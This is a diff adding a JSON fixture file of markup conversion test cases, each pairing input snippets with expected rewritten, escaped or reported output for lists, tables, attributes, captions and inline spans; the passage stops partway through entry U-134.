@@ -1,0 +1,3021 @@
+[
+  {
+    "id": "U-001",
+    "title": "Heading directly under text",
+    "inputs": [
+      "Some text\n# Heading\n"
+    ],
+    "outputs": [
+      "Some text\n\n# Heading\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-002",
+    "title": "Quote directly under text",
+    "inputs": [
+      "Some text\n> quote\n"
+    ],
+    "outputs": [
+      "Some text\n\n> quote\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-003",
+    "title": "Attribute line directly under text",
+    "inputs": [
+      "Some text\n{.x}\nNext block\n"
+    ],
+    "outputs": [
+      "Some text\n\n{.x}\nNext block\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-004",
+    "title": "Description list directly under text",
+    "inputs": [
+      "Some text\n:: term\n: description\n"
+    ],
+    "outputs": [
+      "Some text\n\n:: term\n: description\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-005",
+    "title": "Definition directly under text",
+    "inputs": [
+      "Some text\n[ref]: https://example.com\n\nSee [ref][].\n"
+    ],
+    "outputs": [
+      "Some text\n\n[ref]: https://example.com\n\nSee [ref][].\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-006",
+    "title": "Heading or quote at column 0 directly under item text",
+    "inputs": [
+      "- item text\n# Heading\n"
+    ],
+    "outputs": [
+      "- item text\n\n# Heading\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-007",
+    "title": "List marker without the quote mark under a list in a quote",
+    "inputs": [
+      "> - a\n- b\n"
+    ],
+    "outputs": [
+      "> - a\n\n- b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-008",
+    "title": "List marker directly after description text",
+    "inputs": [
+      ":: term\n: desc\n- item\n"
+    ],
+    "outputs": [
+      ":: term\n: desc\n\n- item\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-009",
+    "title": "Term mark directly under item text",
+    "inputs": [
+      "- text\n  :: term\n  : desc\n"
+    ],
+    "outputs": [
+      "- text\n\n  :: term\n  : desc\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-010",
+    "title": "Block directly under a caption line",
+    "inputs": [
+      "| a | b |\n^ Caption\n# Heading\n"
+    ],
+    "outputs": [
+      "| a | b |\n^ Caption\n\n# Heading\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-011",
+    "title": "Include directive",
+    "inputs": [
+      "Some text\n{{ other.crv }}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-012",
+    "title": "List marker directly under text at the top level",
+    "inputs": [
+      "Some text\n- item\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-013",
+    "title": "Table row, fence line or `***` directly under text",
+    "inputs": [
+      "Some text\n| a | b |\n\nSome text\n```\ncode\n```\n\nSome text\n***\nmore\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-014",
+    "title": "`+` line before a block in an item",
+    "inputs": [
+      "- step one\n+\n> a note\n- step two\n"
+    ],
+    "outputs": [
+      "- step one\n\n  > a note\n- step two\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-015",
+    "title": "`+` line before a paragraph in an item",
+    "inputs": [
+      "- a\n+\nsecond\n- b\n"
+    ],
+    "outputs": [
+      "- a\n\n  second\n- b\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-016",
+    "title": "`+` line in a quote",
+    "inputs": [
+      "> quoted\n+\n- a list inside the quote\n"
+    ],
+    "outputs": [
+      "> quoted\n>\n> - a list inside the quote\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-017",
+    "title": "`+` as the first block of an item",
+    "inputs": [
+      "- +\n  ```\n  code\n  ```\n- two\n"
+    ],
+    "outputs": [
+      "- ```\n  code\n  ```\n- two\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-018",
+    "title": "Blank line inside an item makes the list loose",
+    "inputs": [
+      "- a\n\n  second\n- b\n"
+    ],
+    "outputs": [
+      "- a\n\n  second\n\n- b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-019",
+    "title": "Later paragraph of a tight item",
+    "inputs": [
+      "- # Heading\n  more\n- b\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-020",
+    "title": "`{loose}` on a list with several items",
+    "inputs": [
+      "{loose}\n- a\n- b\n"
+    ],
+    "outputs": [
+      "- a\n\n- b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-021",
+    "title": "Loose list with one item",
+    "inputs": [
+      "{loose}\n- Note text.\n",
+      "- item\n\n\t```\n\tx\n\t```\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-023",
+    "title": "Marker indented less than the content column of the item above",
+    "inputs": [
+      "1. outer\n  1. inner\n",
+      "- item text\n 3. child\n",
+      "- a\n - b\n",
+      "1. item\n  - child\n"
+    ],
+    "outputs": [
+      "1. outer\n1. inner\n",
+      "- item text\n3. child\n",
+      "- a\n- b\n",
+      "1. item\n- child\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-025",
+    "title": "Ordered marker of ten or more digits",
+    "inputs": [
+      "1234567890. x\n"
+    ],
+    "outputs": [
+      "{start=1234567890}\n. x\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-026",
+    "title": "Comment block at column 0 between two items",
+    "inputs": [
+      "- a\n%%%\nx\n%%%\n- b\n"
+    ],
+    "outputs": [
+      "- a\n  %%%\n  x\n  %%%\n- b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-027",
+    "title": "Three blank lines between two lists",
+    "inputs": [
+      "- a\n\n\n\n- b\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-028",
+    "title": "`-` and `*` items",
+    "inputs": [
+      "- one\n* two\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-029",
+    "title": "Comment-only line between items, empty task box, `- -`",
+    "inputs": [
+      "- a\n%% c\n- b\n",
+      "- [ ]\n",
+      "- -\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-030",
+    "title": "Uppercase letter marker",
+    "inputs": [
+      "A. Smith went home.\n\nA.  one\nB.  two\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-031",
+    "title": "Attribute line above a blank line",
+    "inputs": [
+      "{.note}\n\nParagraph.\n"
+    ],
+    "outputs": [
+      "{.note}\nParagraph.\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-032",
+    "title": "Attribute block over several lines",
+    "inputs": [
+      "{.a\n .b}\nParagraph.\n"
+    ],
+    "outputs": [
+      "{.a .b}\nParagraph.\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-033",
+    "title": "Attribute line between two items",
+    "inputs": [
+      "- a\n{.x}\n- b\n"
+    ],
+    "outputs": [
+      "- a\n\n{.x}\n- b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-034",
+    "title": "Attribute line that reaches no block",
+    "inputs": [
+      "Paragraph.\n\n{.x}\n"
+    ],
+    "outputs": [
+      "Paragraph.\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-035",
+    "title": "Glued and stacked attribute blocks, empty braces",
+    "inputs": [
+      "{.a}{#b}\nParagraph.\n",
+      "{.a}\n{.b}\nParagraph.\n",
+      "{}\nParagraph.\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-036",
+    "title": "Order of attributes in HTML",
+    "inputs": [
+      "{.a #b}\nParagraph.\n\n[x]{.a #b}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-037",
+    "title": "Attribute block after a fence language or an admonition name",
+    "inputs": [
+      "```js{1,3}\na\n```\n"
+    ],
+    "outputs": [
+      "```js\na\n```\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-038",
+    "title": "Definition inside a quote or an item",
+    "inputs": [
+      "> See [ref][].\n>\n> [ref]: https://example.com\n\nOutside [ref][].\n",
+      "- item[^n]\n\n  [^n]: A note defined in the item.\n"
+    ],
+    "outputs": [
+      "> See [ref][].\n\n[ref]: https://example.com\n\nOutside [ref][].\n",
+      "- item[^n]\n\n[^n]: A note defined in the item.\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-039",
+    "title": "Indented definition at the top level",
+    "inputs": [
+      "Text [a][].\n\n [a]: /u\n"
+    ],
+    "outputs": [
+      "Text [a][].\n\n[a]: /u\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-040",
+    "title": "Duplicate link definition",
+    "inputs": [
+      "[a]: /one\n[a]: /two\n\n[x][a]\n"
+    ],
+    "outputs": [
+      "[a]: /two\n\n[x][a]\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-041",
+    "title": "Duplicate abbreviation definition",
+    "inputs": [
+      "*[HTML]: First\n*[HTML]: Second\n\nHTML here.\n"
+    ],
+    "outputs": [
+      "*[HTML]: Second\n\nHTML here.\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-042",
+    "title": "Definitions that read the same",
+    "inputs": [
+      "Text[^n].\n\n[^n]: first\n[^n]: second\n",
+      "[a]: /u junk\n\n[x][a]\n",
+      "Text[^n].\n\n[^n]:\n    body\n",
+      "Text[^n].\n\n[^n]: > quoted\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-043",
+    "title": "`#` headings, closing hashes, brace text, seven markers",
+    "inputs": [
+      "# One\n# Two\n",
+      "# Title #\n",
+      "# A {.c}\n",
+      "####### seven\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-044",
+    "title": "Hyphen or underscore run",
+    "inputs": [
+      "para\n\n---\n\nnext\n\n___\n\n-----\n"
+    ],
+    "outputs": [
+      "para\n\n***\n\nnext\n\n***\n\n***\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-045",
+    "title": "Spaced breaks",
+    "inputs": [
+      "* * *\n\n- - -\n"
+    ],
+    "outputs": [
+      "***\n\n***\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-046",
+    "title": "Spaced underscores, stars under an item",
+    "inputs": [
+      "_ _ _\n",
+      "- item\n\n  ***\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-047",
+    "title": "Format names, the space before them, unclosed frontmatter",
+    "inputs": [
+      "--- toml\na = 1\n---\ntext\n",
+      "---toml\na = 1\n---\ntext\n",
+      "--- yaml\na: 1\n---\ntext\n",
+      "---\ntext\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-048",
+    "title": "Unknown format name",
+    "inputs": [
+      "---markdown\na = 1\n---\ntext\n"
+    ],
+    "outputs": [
+      "---\na = 1\n---\ntext\n"
+    ],
+    "class": "none"
+  },
+  {
+    "id": "U-049",
+    "title": "Fence closer at another indent",
+    "inputs": [
+      "```\ncode\n   ```\nafter\n"
+    ],
+    "outputs": [
+      "````\ncode\n   ```\nafter\n````\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-050",
+    "title": "`%%%` closer followed by text",
+    "inputs": [
+      "%%%\nhidden\n%%% visible?\nafter\n"
+    ],
+    "outputs": [
+      "%%%\nhidden\nvisible?\n%%%\nafter\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-052",
+    "title": "`%%` line inside a line block",
+    "inputs": [
+      "::: |\none\n%% hidden\ntwo\n:::\n"
+    ],
+    "outputs": [
+      "::: |\none\n{% hidden %}\ntwo\n:::\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-053",
+    "title": "Tab in code under a container",
+    "inputs": [
+      "- item\n\n\t```\n\tx\n\t\ty\n\t```\n"
+    ],
+    "outputs": [
+      "- item\n\n\t```\n\tx\n\t    y\n\t```\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-054",
+    "title": "Fence and div spellings that read the same",
+    "inputs": [
+      "{title=\"T\"}\n```js\ncode\n```\n",
+      "```js \"T\"\ncode\n```\n",
+      "```\ncode\n``` not a closer\nmore\n```\n",
+      ":::note\nbody\n:::\n",
+      "::: figure \"T\"\n![a](i.png)\n:::\n",
+      "- %%%\n  hidden\n  %%%\n- b\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-055",
+    "title": "GFM separator row",
+    "inputs": [
+      "| a | b |\n|---|--:|\n| 1 | 2 |\n"
+    ],
+    "outputs": [
+      "|= a |={>} b |\n| 1 | 2 |\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-056",
+    "title": "Glued alignment marks",
+    "inputs": [
+      "|=< a |=> b |=~ c |\n| 1 | 2 | 3 |\n"
+    ],
+    "outputs": [
+      "|={<} a |={>} b |={~} c |\n| 1 | 2 | 3 |\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-057",
+    "title": "Escaped last pipe",
+    "inputs": [
+      "| a | b \\|\n"
+    ],
+    "outputs": [
+      "| a | b \\| |\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-058",
+    "title": "`header-rows` on a pipe table",
+    "inputs": [
+      "{header-rows=1}\n| a | b |\n| 1 | 2 |\n"
+    ],
+    "outputs": [
+      "|= a |= b |\n| 1 | 2 |\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-059",
+    "title": "`footer-rows` on a table with only a header row",
+    "inputs": [
+      "{footer-rows=1}\n|= a |= b |\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-060",
+    "title": "Row span into the head",
+    "inputs": [
+      "|= a |= b |\n| ^ | 2 |\n| 3 | 4 |\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-061",
+    "title": "Delimited table with bad quoting",
+    "inputs": [
+      "{table}\n```csv\na,\"b\nc,d\n```\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-062",
+    "title": "Table forms that read the same",
+    "inputs": [
+      "| a | b\n| c | d\n",
+      "| a | b |\n| c | d\n| e | f |\n",
+      "| a | b |\n+ x | y | extra |\n",
+      "| a | b |\n+ x | y\n",
+      "| a | b |{.r}\n",
+      "{aligns=\"right,center\"}\n| a | b |\n",
+      "| a | `b|`\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-063",
+    "title": "Caption after a blank line",
+    "inputs": [
+      "| a | b |\n\n^ Caption\n",
+      "> quote\n\n^ Author\n"
+    ],
+    "outputs": [
+      "| a | b |\n^ Caption\n",
+      "> quote\n^ Author\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-064",
+    "title": "Captions that read the same",
+    "inputs": [
+      "```js\nlet x = 1\n```\n^ Listing one\n",
+      "::: figure\n![a](i.png)\n![b](j.png)\n:::\n^ Group caption\n",
+      "$$`x^2`\n^ Equation\n",
+      "![alt](i.png)\n^ Caption\n",
+      "> quoted\nlazy line\n^ Author\n",
+      "Some text\n^ not a caption\n",
+      "- a\n^ not a caption\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-065",
+    "title": "Bare underline",
+    "inputs": [
+      "an _underlined_ word and snake_case and _id\n",
+      "_z_/y/\n"
+    ],
+    "outputs": [
+      "an {_underlined_} word and snake_case and _id\n",
+      "{_z_}\\/y/\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-066",
+    "title": "Bare strike",
+    "inputs": [
+      "a ~struck~ word and ~/config\n"
+    ],
+    "outputs": [
+      "a {~struck~} word and ~/config\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-067",
+    "title": "Bare highlight",
+    "inputs": [
+      "a =marked= word and x =1, y= 2\n"
+    ],
+    "outputs": [
+      "a {=marked=} word and x {=1, y=} 2\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-068",
+    "title": "Emphasis outside strong",
+    "inputs": [
+      "/*bold italic*/ and */bold italic/*\n"
+    ],
+    "outputs": [
+      "*/bold italic/* and */bold italic/*\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-069",
+    "title": "Substitution arrow",
+    "inputs": [
+      "{~old~>new~}\n"
+    ],
+    "outputs": [
+      "{-old-}{+new+}\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-070",
+    "title": "Delimiter inside a braced span that closes an outer span",
+    "inputs": [
+      "*bold {/note*/} more*\n"
+    ],
+    "outputs": [
+      "*bold {/note\\*/} more*\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-071",
+    "title": "Single opening quote with no closer",
+    "inputs": [
+      "said 'Bob and left.\n"
+    ],
+    "outputs": [
+      "said ’Bob and left.\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-072",
+    "title": "Editorial comment that starts like an id",
+    "inputs": [
+      "a*{#b} c #}\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-073",
+    "title": "Sigil after a letter or number",
+    "inputs": [
+      "see config:items[0] and :smile: and x:smile:\n",
+      "color #fff and a#tag and é#tag and #tag\n",
+      "mail a@user and é@user and @user and (@user)\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-074",
+    "title": "Inline spellings that read the same",
+    "inputs": [
+      "***bold italic*** here\n",
+      "**bold** and //it//\n",
+      "[a]{} and [b]{.c}\n",
+      "!`x` and !`y`{.c}\n",
+      "x{^2^} H{,2,}O ^bare^ ,bare,\n",
+      "{+add+} {-del-} {_u_} {~s~} {=h=}\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-075",
+    "title": "References that read the same",
+    "inputs": [
+      "See [^n](/u).\n\n[^n]: Note.\n",
+      "See [x][ ] here.\n",
+      "[Ref]: /u\n\n[x][ref]\n",
+      "# Pic\n\n![Pic][]\n",
+      "# My Heading\n\nSee [My Heading][].\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-076",
+    "title": "Raw HTML block",
+    "inputs": [
+      "```=html\n<b>x</b>\n```\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-077",
+    "title": "Raw HTML span",
+    "inputs": [
+      "a `<b>x</b>`{=html} b\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-078",
+    "title": "Bare HTML tag",
+    "inputs": [
+      "a <b>bold</b> tag\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-079",
+    "title": "Render options of the host",
+    "inputs": [],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-101",
+    "title": "`=` at the start of a paragraph, an item or a quote",
+    "inputs": [
+      "= 4 is the answer\nand more.\n",
+      "== Section\n",
+      "- = x\n",
+      "> = x\n"
+    ],
+    "outputs": [
+      "\\= 4 is the answer\nand more.\n",
+      "\\== Section\n",
+      "- \\= x\n",
+      "> \\= x\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-102",
+    "title": "Indented line directly under a heading",
+    "inputs": [
+      "# Heading\n  indented text\n",
+      "- # Heading\n    more\n"
+    ],
+    "outputs": [
+      "# Heading\nindented text\n",
+      "- # Heading\n  more\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-103",
+    "title": "Letter marker with one space",
+    "inputs": [
+      "a. one\nb. two\n",
+      "v. a\nw. b\n",
+      "v. five\nvi. six\n"
+    ],
+    "outputs": [
+      "a\\. one\nb. two\n",
+      "v\\. a\nw. b\n",
+      "v\\. five\nvi. six\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-104",
+    "title": "Quote fence or line block with a title",
+    "inputs": [
+      "::: > \"T\"\nquoted\n:::\n"
+    ],
+    "outputs": [
+      "\\::: > \"T\"\nquoted\n:::\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-105",
+    "title": "Raw fence with a title",
+    "inputs": [
+      "```=html \"T\"\n<b>x</b>\n```\n"
+    ],
+    "outputs": [
+      "{%%}```=html \"T\"\n<b>x</b>```\n```\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-106",
+    "title": "Text line directly under a term",
+    "inputs": [
+      ":: term\nmore term text\n: first description\n",
+      ":: term\n:{.c} desc\n"
+    ],
+    "outputs": [
+      ":: term\n\nmore term text\n: first description\n",
+      ":: term\n\n:{.c} desc\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-107",
+    "title": "Second caret line under a caption",
+    "inputs": [
+      "| a | b |\n^ first\n^ second\n"
+    ],
+    "outputs": [
+      "| a | b |\n^ first\n\n^ second\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-108",
+    "title": "Row attribute one space after the closing pipe",
+    "inputs": [
+      "| a | b | {.r}\n"
+    ],
+    "outputs": [
+      "| a | b | \\{.r}\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-109",
+    "title": "Line indented short of the content column after a blank line",
+    "inputs": [
+      "- item\n\n second paragraph\n",
+      "Text[^a].\n\n[^a]: first\n\n second para one space\n"
+    ],
+    "outputs": [
+      "- item\n\nsecond paragraph\n",
+      "Text[^a].\n\n[^a]: first\n\nsecond para one space\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-110",
+    "title": "Full reference whose label is a heading",
+    "inputs": [
+      "# My Heading\n\nSee [My Heading][] and [the text][My Heading].\n"
+    ],
+    "outputs": [
+      "# My Heading\n\nSee [My Heading][] and \\[the text][My Heading].\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-111",
+    "title": "Reference label that wraps",
+    "inputs": [
+      "See [the text][a long\nlabel] here.\n\n[a long label]: /u\n"
+    ],
+    "outputs": [
+      "See \\[the text]\\[a long\nlabel] here.\n\n[a long label]: /u\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-112",
+    "title": "Reference label that starts with a caret",
+    "inputs": [
+      "See [x][^n].\n\n[^n]: Note.\n"
+    ],
+    "outputs": [
+      "See [x]\\[^n].\n\n[^n]: Note.\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-113",
+    "title": "Markup inside an unresolved reference",
+    "inputs": [
+      "See [*b* and /i/][nope] and [`c`][].\n",
+      "See [a^[note] b][nope].\n"
+    ],
+    "outputs": [
+      "See [\\*b\\* and \\/i\\/][nope] and [\\`c\\`][].\n",
+      "See [a\\^[note] b][nope].\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-114",
+    "title": "New spellings that 0.1 already had",
+    "inputs": [
+      ". first\n. second\n",
+      "::: >\nquoted\nsecond\n:::\n",
+      "::: spoiler \"Title\"\nbody\n:::\n",
+      "{start=9}\na) one\nb) two\n",
+      ":::: note\nbody\n:::\nafter\n::::\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-115",
+    "title": "Hyphen run 0.1 kept as typed, and the braced en dash",
+    "inputs": [
+      "a{--}b and --flag\n",
+      "run --verbose (--b) and a-{--}\n"
+    ],
+    "outputs": [
+      "a--b and -\\-flag\n",
+      "run -\\-verbose (-\\-b) and a\\---\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-116",
+    "title": "Tilde fence",
+    "inputs": [
+      "~~~js\nx\n~~~\n",
+      "~~~~ py \"t\"\na ``` b\n~~~~~\n"
+    ],
+    "outputs": [
+      "```js\nx\n```\n",
+      "```` py \"t\"\na ``` b\n````\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-117",
+    "title": "List of task items next to a list of plain items",
+    "inputs": [
+      "- [ ] a\n- b\n",
+      "- a\n\n- [x] b\n",
+      "> - [ ] a\n> - b\n"
+    ],
+    "outputs": [
+      "- [ ] a\n\n\n\n- b\n",
+      "- a\n\n\n\n- [x] b\n",
+      "> - [ ] a\n>\n>\n>\n> - b\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-118",
+    "title": "Uppercase marker with a dot and one space",
+    "inputs": [
+      "II. Background\n",
+      "MD. Jones\n",
+      "I.  a\nII. b\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-119",
+    "title": "List marker left of every open list under item text",
+    "inputs": [
+      "  - a\n- b\n",
+      " 9. a\n10. b\n",
+      "- a\n    - b\n  - c\n"
+    ],
+    "outputs": [],
+    "class": "none"
+  },
+  {
+    "id": "U-120",
+    "title": "Ordered task box kept as text",
+    "inputs": [
+      "1. [ ] x\n",
+      "II) [x] y\n"
+    ],
+    "outputs": [
+      "1. \\[ ] x\n",
+      "II) \\[x] y\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-121",
+    "title": "Defined shortcut kept as text",
+    "inputs": [
+      "[text]\n\n[text]: /u\n",
+      "![text]\n\n[text]: /u\n"
+    ],
+    "outputs": [
+      "\\[text]\n\n[text]: /u\n",
+      "!\\[text]\n\n[text]: /u\n"
+    ],
+    "class": "escape"
+  },
+  {
+    "id": "U-122",
+    "title": "Plus continuation in a list item",
+    "inputs": [
+      "- > +"
+    ],
+    "outputs": [
+      "- >"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-123",
+    "title": "Plus continuation in a description body",
+    "inputs": [
+      ":: t\n: +",
+      ":: term\n:  intro\n+\n  more\n"
+    ],
+    "outputs": [
+      ":: t\n: {% %}",
+      ":: term\n:  intro\n\nmore\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-124",
+    "title": "Plus continuation in a footnote body",
+    "inputs": [
+      "a\n[^n]: +"
+    ],
+    "outputs": [
+      "a\n\n[^n]: +"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-125",
+    "title": "Plus continuation in a quote",
+    "inputs": [
+      "> +\n>"
+    ],
+    "outputs": [
+      ">\n>"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-126",
+    "title": "Empty quote directly under paragraph text",
+    "inputs": [
+      "y\n>"
+    ],
+    "outputs": [
+      "y\n\n>"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-127",
+    "title": "Code fence ending at a list item boundary",
+    "inputs": [
+      "- ```\n\n+"
+    ],
+    "outputs": [
+      "- ```\n\n  ```"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-128",
+    "title": "Description mark at its owning column",
+    "inputs": [
+      " :: t\n: x"
+    ],
+    "outputs": [
+      ":: t\n: x"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-129",
+    "title": "Percent comment fence ownership",
+    "inputs": [
+      "%%%\n%%%%\ny",
+      "- a\n %%% n\n x\n %%%\n tail\n",
+      "- intro\n%%%\nc\n%%%\n  tail\n",
+      "- - a\n %%% c\n x\n %%%\n b\n",
+      ":: t\n:  x\n%%%\ny\n%%%\n   more\n",
+      ":: t\n:  x\n %%%\ny\n %%%\nz\n",
+      ":: t\n:  x\n  %%%\ny\n  %%%\nz\n",
+      "- intro\n  %% a\n%%%\nb\n%%%\n  tail\n",
+      "> > - %%%\n> > %%%\n> > %%%\n> > x\nt\n",
+      "> - %%%\n> %%%\n> %%%\n> x\nt\n",
+      "> > > 1. %%%%\n> > > %%%%\n> > > %%%%\n> > > x\n- t\n",
+      "> :: d\n> : %%%\n> %%%\n> %%%\n> x\n: t\n"
+    ],
+    "outputs": [
+      "%%%%%\n%%%%\ny",
+      "- a\n %%% n\n x\n %%%\ntail\n",
+      "- intro\n  %%%\n  c\n  %%%\n  tail\n",
+      "- - a\n %%% c\n x\n %%%\nb\n",
+      ":: t\n:  x\n  %%%\n  y\n  %%%\n   more\n",
+      ":: t\n:  x\n  %%%\n  y\n  %%%\nz\n",
+      ":: t\n:  x\n  %%%\n  y\n  %%%\nz\n",
+      "- intro\n  %% a\n  %%%\n  b\n  %%%\n  tail\n",
+      "> > - %%%\n> > %%%\n> > %%%\n> > %%%\n> > x\nt\n",
+      "> - %%%\n> %%%\n> %%%\n> %%%\n> x\nt\n",
+      "> > > 1. %%%%\n> > > %%%%\n> > > %%%%\n> > > %%%%\n> > > x\n- t\n",
+      "> :: d\n> : %%%\n> %%%\n> %%%\n> %%%\n> x\n: t\n"
+    ],
+    "class": "rewrite"
+  },
+  {
+    "id": "U-130",
+    "title": "Line block body text and whitespace",
+    "inputs": [
+      "::: |\n\tx",
+      "> ::: |\n> ```\n> x\nafter\n",
+      "- ::: |\n  - ```\ntail\n",
+      "> 1. ::: box\n>    - ::: |\n>      ```\n>      x\n>      ```\n>      :::\n>     ```\n>     - x\n> ```\n"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-131",
+    "title": "Definition-shaped text in a list item",
+    "inputs": [
+      "* [d]:"
+    ],
+    "outputs": [
+      "* {% %}"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-132",
+    "title": "Empty or container-local link definition",
+    "inputs": [
+      "[r]:"
+    ],
+    "outputs": [],
+    "class": "report"
+  },
+  {
+    "id": "U-133",
+    "title": "Task item HTML",
+    "inputs": [
+      "- [ ] +",
+      "-{#k} [x] bare\n  # inside\n",
+      "-{#k} [x] old\n      # outside\n",
+      "-{title=\"😀\"} [x] a\n  # h\n"
+    ],
+    "outputs": [
+      "- [ ] {% %}",
+      "-{#k} [x] bare\n\n  # inside\n",
+      "-{#k} [x] old\n\n      # outside\n",
+      "-{title=\"😀\"} [x] a\n\n  # h\n"
+    ],
+    "class": "report"
+  },
+  {
+    "id": "U-134",
